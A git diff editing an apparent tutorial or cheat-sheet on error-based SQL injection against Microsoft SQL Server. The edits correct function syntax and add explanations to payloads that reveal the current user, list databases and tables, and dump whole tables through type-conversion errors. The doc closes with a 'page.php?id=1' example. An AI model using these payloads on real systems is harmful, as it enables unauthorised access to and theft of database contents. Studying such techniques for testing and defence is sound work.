@@ -2,7 +2,9 @@
 
 In MSSQL, the name of the database objects are revealed within errors. the user sa is the super admin and has access to the master database. The master database contains schemas of user-defined dbs.
 
-First thing we can do to start exploting it is to discover the database version, we can trigger a type conversion error for that:
+First thing we can do to start exploting it is to discover the database version, we can trigger a type conversion error for that.
+
+
 
 ```text
 99999 or 1 in (SELECT TOP 1 CAST(<FIELDNAME> as varchar(4096)) from <TABLENAME> WHERE <FIELDNAME> NOT IN (<LIST>)); --
@@ -28,19 +30,23 @@ So, with all this information, how can I dump the entire database?
 
 First of all, we need to discover some stuff:
 
-* Current database username
+* Current database username:
 
 ```text
-99999 or 1 in (SELECT TOP 1 CAST(@@user_name as varchar(4096))) --
+99999 or 1 in (SELECT TOP 1 CAST(user_name() as varchar(4096))) --
 ```
+
+\*user\_name\(\) is a MSSQL function which returns the current user.
 
 * Current databases and all other databases the user can read
 
 ```text
-99999 or 1 in (SELECT TOP 1 CAST(@@db_name(0) as varchar(4096))) --
-99999 or 1 in (SELECT TOP 1 CAST(@@db_name(1) as varchar(4096))) --
-99999 or 1 in (SELECT TOP 1 CAST(@@db_name(2) as varchar(4096))) --
+99999 or 1 in (SELECT TOP 1 CAST(db_name(0) as varchar(4096))) --
+99999 or 1 in (SELECT TOP 1 CAST(db_name(1) as varchar(4096))) --
+99999 or 1 in (SELECT TOP 1 CAST(db_name(2) as varchar(4096))) --
 ```
+
+\*db\_name\(\) functoin accesses the master..sysdatabases table, which stores all databases installed. We can only see dbs that the user has rights to.
 
 * The tables into a given database
 
@@ -70,7 +76,7 @@ Finally, to dump the database, we can use the following query:
 9999 or 1 in (SELECT TOP 1 CAST (<column name> as varchar (4096) ) FROM <db name>..<table name> WHERE <column name> NOT IN (<retrieved data list>)); -- -
 ```
 
-###  Example
+## Example
 
 Lets say we have an exploitable page.php?id=1 and identified the table users in the database cms
 
